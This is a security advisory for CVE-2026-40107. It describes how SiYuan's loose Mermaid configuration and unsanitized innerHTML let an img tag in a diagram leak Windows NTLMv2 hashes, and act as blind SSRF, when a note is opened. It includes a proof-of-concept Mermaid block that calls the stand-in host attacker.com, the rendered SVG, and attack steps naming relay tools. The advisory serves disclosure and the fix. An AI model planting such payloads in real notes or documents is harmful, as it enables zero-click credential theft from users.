# [H] SiYuan Affected by Zero-Click NTLM Hash Theft and Blind SSRF via Mermaid Diagram Rendering

## Summary
Severity: High
Advisory: GHSA-w95v-4h65-j455
CVE: CVE-2026-40107
CWE: CWE-918
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:L/SI:L/SA:N (CVSS_V4)
Published: 2026-04-10
Source: https://github.com/advisories/GHSA-w95v-4h65-j455
Type: github-advisory

## Affected
- Go: `github.com/siyuan-note/siyuan/kernel` — affected >=0 <0.0.0-20260407035653-2f416e5253f1

## Details
SiYuan configures Mermaid.js with `securityLevel: "loose"` and `htmlLabels: true`. In this mode, `<img>` tags with `src` attributes survive Mermaid's internal DOMPurify and land in SVG `<foreignObject>` blocks. The SVG is injected via `innerHTML` with no secondary sanitization. When a victim opens a note containing a malicious Mermaid diagram, the Electron client fetches the URL.

On Windows, a protocol-relative URL (`//attacker.com/image.png`) resolves as a UNC path (`\\attacker.com\image.png`). Windows attempts SMB authentication automatically, sending the victim's NTLMv2 hash to the attacker.

## Root Cause

Mermaid initialization at `app/src/protyle/render/mermaidRender.ts` lines 28 and 33:

    mermaid.initialize({
        securityLevel: "loose",
        flowchart: {
            htmlLabels: true,
        },
    });

SVG injection at line 101:

    renderElement.lastElementChild.innerHTML = mermaidData.svg;

No DOMPurify or other sanitization between the Mermaid output and DOM insertion.

Mermaid v11.12.0 in "loose" mode strips active JavaScript (`<script>`, `onerror`, `onload`) but explicitly allows `<img>` tags with `src` attributes in the final SVG output. Verified by rendering the PoC below through the Mermaid CLI with matching configuration.

The Electron main process at `app/electron/main.js` line 78 sets `disable-web-security`, and lines 319+ set `webSecurity: false`, `nodeIntegration: true`, `contextIsolation: false` on all BrowserWindows. The disabled web security allows protocol-relative URLs to resolve as UNC paths.

## Proof of Concept

Mermaid code block in a SiYuan note:

    ```mermaid
    graph TD
        A["<img src='//attacker.com/share/img.png'>"] --> B[Normal Node]
    ```

Rendered SVG output (verified with Mermaid CLI 11.12.0, `securityLevel: "loose"`, `htmlLabels: true`):

    <foreignObject>
      <div xmlns="http://www.w3.org/1999/xhtml">
        <span class="nodeLabel">
          <p><img src="//attacker.com/share/img.png" style="..."></p>
        </span>
      </div>
    </foreignObject>

What was stripped by Mermaid's internal sanitizer (verified): `onerror`, `onload`, all event handler attributes, `<script>` tags, `file://` URLs.

What survived (verified): `<img src="http://...">`, `<img src="//...">`.

Attack steps:
1. Attacker creates a note or .sy export containing the Mermaid block above
2. Attacker hosts a listener on attacker.com (Responder, ntlmrelayx, or HTTP logger)
3. Victim imports the notebook or opens the shared note
4. SiYuan renders the Mermaid diagram, injects SVG via innerHTML
5. Electron fetches `//attacker.com/share/img.png`

On Windows: Electron resolves the protocol-relative URL as a UNC path. Windows sends NTLMv2 credentials to the attacker's SMB server.

On macOS/Linux: Electron makes an HTTP request to the attacker's server, leaking the victim's IP and confirming when the note was read.

## Impact

Zero-click credential theft on Windows. The victim only needs to view the note. NTLMv2 hashes can be cracked offline or used in relay attacks. On all platforms, the request acts as a tracking pixel and blind SSRF from the victim's machine.

No configuration changes required. The `securityLevel: "loose"` setting is hardcoded in SiYuan's Mermaid initialization.

## Suggested Fix

Change Mermaid initialization to `securityLevel: "strict"`. If HTML labels are required, add a DOMPurify pass on the SVG output before the innerHTML assignment at mermaidRender.ts:101, configured to strip `<img>` tags or enforce a strict URI allowlist blocking external and protocol-relative URLs.

## References
- https://github.com/siyuan-note/siyuan/security/advisories/GHSA-w95v-4h65-j455
- https://nvd.nist.gov/vuln/detail/CVE-2026-40107
- https://github.com/siyuan-note/siyuan
